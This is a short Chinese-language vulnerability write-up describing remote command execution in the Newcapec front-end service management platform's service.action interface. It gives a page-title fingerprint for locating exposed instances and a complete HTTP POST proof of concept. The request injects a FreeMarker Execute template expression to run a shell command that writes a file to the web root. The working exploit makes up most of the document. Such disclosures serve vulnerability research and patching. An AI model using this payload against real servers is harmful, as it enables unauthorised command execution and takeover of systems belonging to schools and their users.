# 新开普 前置服务管理平台 service.action 远程命令执行漏洞

## 漏洞描述

新开普 前置服务管理平台 service.action 接口存在远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限

## 漏洞影响

<a-checkbox checked>新开普 前置服务管理平台</a-checkbox></br>

## 网络测绘

<a-checkbox checked>title="掌上校园服务管理平台"</a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1691989411711-5c56958b-5bbf-4b98-89c2-4151004d3504.png)

验证POC

```http
POST /service_transport/service.action HTTP/1.1
Host: 
Accept: */*
Content-Type: application/json

{"command":"GetFZinfo","UnitCode":"<#assign ex = \"freemarker.template.utility.Execute\"?new()>${ex(\"cmd /c echo Test > ./webapps/ROOT/Test.txt\")}"}
```

![img](../../../.vuepress/public/img/1691990575177-be0f5d8c-cd7e-4274-a782-6fd506f39232.png)

![img](../../../.vuepress/public/img/1691990627821-b50c7d15-6d79-4fff-8aa8-e546cec37abf.png)